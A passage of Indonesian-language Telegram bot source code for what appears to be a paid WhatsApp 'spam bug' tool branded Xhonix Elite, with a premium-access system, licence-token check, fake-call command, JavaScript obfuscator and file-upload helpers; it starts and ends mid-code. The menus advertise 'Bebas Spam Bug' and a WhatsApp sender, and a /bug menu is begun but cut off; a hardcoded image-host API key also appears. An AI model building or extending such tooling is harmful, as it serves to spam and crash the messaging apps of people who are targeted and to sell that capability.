  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});

function buildAnalyzer(code, results = [], replied = null, args = []) {
  const lines = code.split("\n");
  const flags = [];

  if (/async/.test(code)) flags.push("async");
  if (/await/.test(code)) flags.push("await");
  if (/require\s*\(/.test(code)) flags.push("require()");
  if (/import\s+/.test(code)) flags.push("import");
  if (/axios/i.test(code)) flags.push("axios");
  if (/telegraf/i.test(code)) flags.push("telegraf");
  if (/\bfs\b/.test(code)) flags.push("fs");

  const mode = /require\s*\(/.test(code)
    ? "CJS"
    : /import\s+/.test(code)
    ? "ESM"
    : "Unknown";

  let syntax = {
    valid: true,
    error: null,
    line: null,
    column: null,
    snippet: ""
  };

  try {
    new vm.Script(code);
  } catch (err) {
    syntax.valid = false;
    syntax.error = err.message;

    const match = err.stack?.match(/:(\d+):(\d+)/);

    if (match) {
      syntax.line = Number(match[1]);
      syntax.column = Number(match[2]);

      const start = Math.max(0, syntax.line - 3);
      const end = Math.min(lines.length, syntax.line + 2);

      for (let i = start; i < end; i++) {
        const pointer = i + 1 === syntax.line ? "👉" : "  ";
        syntax.snippet += `${pointer} ${String(i + 1).padStart(4)} | ${lines[i]}\n`;
      }
    }
  }

  const stats = {};
  results.forEach(x => {
    stats[x.type] = (stats[x.type] || 0) + 1;
  });

  const now = new Date();

  let output = `🧪 Function Analyzer

🕒 ${now.toLocaleTimeString("id-ID")}
📅 ${now.toLocaleDateString("id-ID")}

━━━━━━━━━━━━━━━━━━━━
📄 File   : ${
    replied?.document?.file_name ||
    args?.[0] ||
    "Source"
  }
📦 Ukuran : ${(Buffer.byteLength(code) / 1024).toFixed(1)} KB
📑 Baris  : ${lines.length}
🔡 Chars  : ${code.length}
🧩 Mode   : ${mode}
⚙️ Flags  : ${flags.length ? flags.join(", ") : "-"}
━━━━━━━━━━━━━━━━━━━━

🧠 Function Terdeteksi (${results.length})

`;

  if (results.length) {
    for (const item of results) {
      output += `• ${item.name}\n  └ ${item.type} | Line ${item.line}\n\n`;
    }
  } else {
    output += "📭 Tidak ditemukan function atau class.\n\n";
  }

  output += "━━━━━━━━━━━━━━━━━━━━\n📊 Statistik\n\n";

  for (const [type, total] of Object.entries(stats)) {
    output += `• ${type}: ${total}\n`;
  }

  output += `\nTotal: ${results.length}\n`;

  if (syntax.valid) {
    output += `\n━━━━━━━━━━━━━━━━━━━━\n\n✅ Syntax Valid\n`;
  } else {
    output += `
━━━━━━━━━━━━━━━━━━━━

❌ Syntax Error

📍 Line   : ${syntax.line ?? "?"}
📍 Column : ${syntax.column ?? "?"}

${syntax.error}

📌 Cuplikan

${syntax.snippet || "Tidak tersedia"}
`;
  }

  return output;
}

// ================= COMMAND /cekfunct =================
bot.command("cekfunct", async (ctx) => {
  try {
    const msg = ctx.message;
    const args = msg.text.split(" ").slice(1);

    let code = "";

    // dari reply file
    if (msg.reply_to_message?.document) {
      const fileLink = await ctx.telegram.getFileLink(
        msg.reply_to_message.document.file_id
      );

      const res = await fetch(fileLink.href);
      code = await res.text();
    }
    // dari text input
    else {
      code = args.join(" ");
    }

    if (!code || code.trim().length === 0) {
      return ctx.reply("Kasih code atau reply file. Jangan kosong, ini bot bukan cenayang.");
    }

    const output = buildAnalyzer(code, [], msg.reply_to_message, args);

    return ctx.reply(output);
  } catch (err) {
    return ctx.reply(`Error: ${err.message}`);
  }
});

bot.command("cekerror", async (ctx) => {
  try {
    const replied = ctx.message.reply_to_message;

    if (!replied?.document) {
      return ctx.reply("📁 Reply ke file JavaScript (.js)");
    }

    const file = replied.document;

    if (!file.file_name?.toLowerCase().endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js");
    }

    const loading = await ctx.reply("⏳ Analyzing source...");

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);

    if (!res.ok) {
      return ctx.reply("❌ Gagal download file");
    }

    const code = await res.text();
    const lines = code.split("\n");

    // ================= FUNCTION DETECTION =================
    const functions = [];
    const regexes = [
      /function\s+([a-zA-Z_$][\w$]*)\s*\(/g,
      /async\s+function\s+([a-zA-Z_$][\w$]*)\s*\(/g,
      /(?:const|let|var)\s+([a-zA-Z_$][\w$]*)\s*=\s*(?:async\s*)?\([^)]*\)\s*=>/g,
      /(?:const|let|var)\s+([a-zA-Z_$][\w$]*)\s*=\s*(?:async\s*)?function\s*\(/g,
      /class\s+([a-zA-Z_$][\w$]*)/g
    ];

    for (const regex of regexes) {
      let match;
      while ((match = regex.exec(code)) !== null) {
        if (!functions.includes(match[1])) {
          functions.push(match[1]);
        }
      }
    }

    // ================= FLAGS =================
    const flags = [
      /async/.test(code) && "async",
      /await/.test(code) && "await",
      /require\s*\(/.test(code) && "require()",
      /import\s+/.test(code) && "import",
      /axios/i.test(code) && "axios",
      /telegraf/i.test(code) && "telegraf",
      /\bfs\b/.test(code) && "fs"
    ].filter(Boolean);

    const mode = /require\s*\(/.test(code)
      ? "CJS"
      : /import\s+/.test(code)
      ? "ESM"
      : "Unknown";

    const now = new Date();

    let report = `🧪 CekError Analyzer

🕒 ${now.toLocaleTimeString("id-ID")}
📅 ${now.toLocaleDateString("id-ID")}

━━━━━━━━━━━━━━━━━━━━
📄 File   : ${file.file_name}
📦 Ukuran : ${(Buffer.byteLength(code, "utf8") / 1024).toFixed(1)} KB
📑 Baris  : ${lines.length}
🔡 Chars  : ${code.length}
🧩 Mode   : ${mode}
⚙️ Flags  : ${flags.join(", ") || "-"}
━━━━━━━━━━━━━━━━━━━━

🧠 Functions (${functions.length})
${functions.length ? functions.map(f => `• ${f}`).join("\n") : "Tidak ditemukan"}
`;

    // ================= SYNTAX CHECK =================
    let syntaxError = null;

    try {
      new vm.Script(code);
    } catch (err) {
      syntaxError = err;
    }

    if (!syntaxError) {
      report += `

━━━━━━━━━━━━━━━━━━━━

✅ Syntax Valid
`;
    } else {
      const match = syntaxError.stack?.match(/:(\d+):(\d+)/);

      const lineNum = match ? Number(match[1]) : null;
      const colNum = match ? match[2] : "?";

      let snippet = "";

      if (lineNum) {
        const start = Math.max(0, lineNum - 3);
        const end = Math.min(lines.length, lineNum + 2);

        for (let i = start; i < end; i++) {
          snippet += `${i + 1 === lineNum ? "👉" : "  "} ${String(i + 1).padStart(4)} | ${lines[i]}\n`;
        }
      }

      report += `

━━━━━━━━━━━━━━━━━━━━

❌ Syntax Error

📍 Line   : ${lineNum || "?"}
📍 Column : ${colNum}

${syntaxError.message}

📌 Cuplikan

${snippet || "Tidak tersedia"}
`;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loading.message_id,
        undefined,
        report
      );
    } catch (e) {
      await ctx.reply(report);
    }

  } catch (err) {
    console.error(err);
    return ctx.reply(`❌ Error\n\n${err.message}`);
  }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

const pendingVerification = new Set();
// ================
// 🔐 VERIFIKASI TOKEN
// ================
bot.use(async (ctx, next) => {
  if (secureMode) return next();
  if (tokenValidated) return next();

  const chatId = (ctx.chat && ctx.chat.id) || (ctx.from && ctx.from.id);
  if (!chatId) return next();
  if (pendingVerification.has(chatId)) return next();
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ];

  let loadingMsg = null;

  try {
    loadingMsg = await ctx.reply("⏳ *BOT SEDANG MEMVERIFIKASI TOKEN...*", {
      parse_mode: "Markdown"
    });

    for (const frame of frames) {
      if (tokenValidated) break;
      await sleep(180);
      try {
        await ctx.telegram.editMessageText(
          loadingMsg.chat.id,
          loadingMsg.message_id,
          null,
          `🔐 *Verifikasi Token Server...*\n${frame}`,
          { parse_mode: "Markdown" }
        );
      } catch { /* skip */ }
    }

    if (!databaseUrl || !tokenBot) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Konfigurasi server tidak lengkap.*\nPeriksa `databaseUrl` atau `tokenBot`.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Fungsi ambil data token pakai HTTPS native
    const getTokenData = () => new Promise((resolve, reject) => {
      https.get(databaseUrl, { timeout: 6000 }, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const json = JSON.parse(data);
            resolve(json);
          } catch {
            reject(new Error("Invalid JSON response"));
          }
        });
      }).on("error", (err) => reject(err));
    });

    let result;
    try {
      result = await getTokenData();
    } catch (err) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Gagal mengambil daftar token dari server.*\nSilakan coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    const tokens = (result && Array.isArray(result.tokens)) ? result.tokens : [];
    if (tokens.length === 0) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Token tidak tersedia di database.*\nHubungi admin untuk memperbarui data.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Validasi token
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ *Token diverifikasi server!*\nMembuka menu utama...",
        { parse_mode: "Markdown" }
      );
      await sleep(1000);
      pendingVerification.delete(chatId);
      return next();
    } else {
      const keyboardBypass = {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/sunnnlyy" }]
        ]
      };

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "*Bypass Detected!*\nToken tidak sah atau tidak terdaftar.\nYour access has been restricted.",
        { parse_mode: "Markdown" }
      );

      await sleep(500);
      await ctx.replyWithPhoto("https://files.catbox.moe/9g24hy.jpg", {
        caption:
          "🚫 *Access Denied*\nSistem mendeteksi token tidak valid.\nGunakan versi original dari owner.",
        parse_mode: "Markdown",
        reply_markup: keyboardBypass
      });

      pendingVerification.delete(chatId);
      return;
    }

  } catch (err) {
    console.error("Verification Error:", err);
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Terjadi kesalahan saat memverifikasi token.*",
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.reply("⚠️ *Terjadi kesalahan saat memverifikasi token.*", {
        parse_mode: "Markdown"
      });
    }
  } finally {
    pendingVerification.delete(chatId);
  }
});

// =========================
// COMMAND START
// =========================
bot.start(async (ctx) => {
const joined = await checkJoin(ctx.from.id);

if (!joined) {
  return ctx.replyWithPhoto(thumbnailUrl, {
    caption: `
<blockquote>𝙽𝙴𝚇𝙾𝚁𝙰 𝚅𝙴𝚁𝚂𝙴 𝚂𝙿𝙰𝙼</blockquote>

≡ Detect @${ctx.from.username || ctx.from.first_name}!
Kamu harus Join Channel terlebih dahulu untuk menggunakan bot ini.

≡ Channel : ${CHANNEL_USERNAME}
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "⇆ Join Channel",
            url: `https://t.me/bluzgtgbgt${CHANNEL_USERNAME.replace("@", "")}`, style: "Primary", icon_custom_emoji_id: "5893203503915996356"
          }
        ],
        [
          {
            text: "⇆ Sudah Join",
            callback_data: "verify_join", style: "Success", icon_custom_emoji_id: "5893494861612455015"
          }
        ]
      ]
    }
  });
}
  if (!tokenValidated)
    return ctx.reply("❌ *Token belum diverifikasi server.* Tunggu proses selesai.", { parse_mode: "Markdown" });
  
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "✅ Premium" : "❌ No Premium";
  const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  // ============================
  // 🔓 OWNER BYPASS FULL
  // ============================
  if (!isOwner) {
    // Jika user buka di private → blokir
    if (ctx.chat.type === "private") {
      // Kirim notifikasi ke owner
      bot.telegram.sendMessage(
        ownerID,
        `📩 *NOTIFIKASI START PRIVATE*\n\n` +
        `👤 User: ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 ID: <code>${ctx.from.id}</code>\n` +
        `🔗 Username: @${ctx.from.username || "-"}\n` +
        `💬 Akses private diblokir.\n\n` +
        `⌚ Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }
  
 
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}

  const menuMessage = `
<blockquote><strong>Xhonix Elite 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ Developer : @bluzstur<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
↯ Version : 1.0 Murbug
↯ Prefix : /
↯ Type : Bebas Spam Bug
↯ Fitur : Auto Update
<blockquote><strong>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</strong></blockquote>
↯ Status : ${premiumStatus}  
↯ Username  : @${ctx.from.username || "Tidak Ada"}
↯ ID   : <code>${userId}</code>
↯ Runtime : ${runtimeStatus}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${senderStatus}`;

  const keyboard = [
        [
            { text: "XBUGS", callback_data: "/bug", style: "Primary", icon_custom_emoji_id: "6041705726206808304" }, 
            { text: "XSETTINGS", callback_data: "/controls", style: "Danger", icon_custom_emoji_id: "5893203503915996356" }
        ],
        [
            { text: "DEVELOPER", url: "https://t.me/sunnnlyy", style: "Success", icon_custom_emoji_id: "5893494861612455015" }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "✅ Premium" : "❌ No Premium";
  const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<blockquote><strong>Xhonix Elite 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ Developer : @bluzstur<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
↯ Version : 1.0 Murbug
↯ Prefix : /
↯ Type : Bebas Spam Bug
↯ Fitur : Auto Update
<blockquote><strong>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</strong></blockquote>
↯ Status : ${premiumStatus}  
↯ Username  : @${ctx.from.username || "Tidak Ada"}
↯ ID   : <code>${userId}</code>
↯ Runtime : ${runtimeStatus}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${senderStatus}`;

  const keyboard = [
        [
            { text: "XBUGS", callback_data: "/bug", style: "Primary", icon_custom_emoji_id: "6041705726206808304" }, 
            { text: "XSETTINGS", callback_data: "/controls", style: "Danger", icon_custom_emoji_id: "5893203503915996356" }
        ],
        [
            { text: "DEVELOPER", url: "https://t.me/bluzstur", style: "Success", icon_custom_emoji_id: "5893494861612455015" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><strong>Xhonix Elite 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ Developer : @bluzstur<tg-emoji emoji-id="5778220576497735613">🌟</tg-emoji>
↯ Version : 1.0 Murbug
↯ Prefix : /
↯ Type : Bebas Spam Bug
↯ Fitur : Auto Update
<blockquote><strong>𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝙼𝙴𝙽𝚄</strong></blockquote>
↯ /blockcmd - Blokir Command
↯ /unblockcmd - Buka Blokir Command
↯ /listblockcmd - List Semua Cmd Di Block
<blockquote><strong>𝙲𝙾𝙽𝚃𝚁𝙾𝙻 𝚂𝙴𝙽𝙳𝙴𝚁</strong></blockquote>
↯ /addbot - Add Sender 
↯ /killsesi - Reset Session
<blockquote><strong>𝙲𝙾𝙾𝙻𝙳𝙾𝚆𝙽 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂</strong></blockquote>
↯ /setcd - Set Cooldown
<blockquote><strong>𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝙰𝙳𝙼𝙸𝙽</strong></blockquote>
↯ /addadmin - Add Admin
↯ /deladmin - Delete Admin
↯ /addprem - Add Premium 
↯ /delprem - Delete Premium
<blockquote><strong>𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂</strong></blockquote>
↯ /addpremgrup - Add Premium Group
↯ /delpremgrup - Delete Premium Group
<blockquote><strong>𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄</strong></blockquote>
↯ /cekerror - cek error js
↯ /tiktok - Tiktok Downloader
↯ /tourl - To Url Image/Video
↯ /tourl2 - To Url Image
↯ /zenc - Encripsi File Js
↯ /fakecall - Telepon Fake
<blockquote><pre>⬡═―—⊱ Click Button Menu ⊰―—═⬡</pre></blockquote>`;

    const keyboard = [
        [
            { text: "BACK", callback_data: "/start", style: "Primary", icon_custom_emoji_id: "5893203503915996356" },
            { text: "CHANNEL", url: "https://t.me/AboutKingZurrx", style: "Success", icon_custom_emoji_id: "5893494861612455015" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
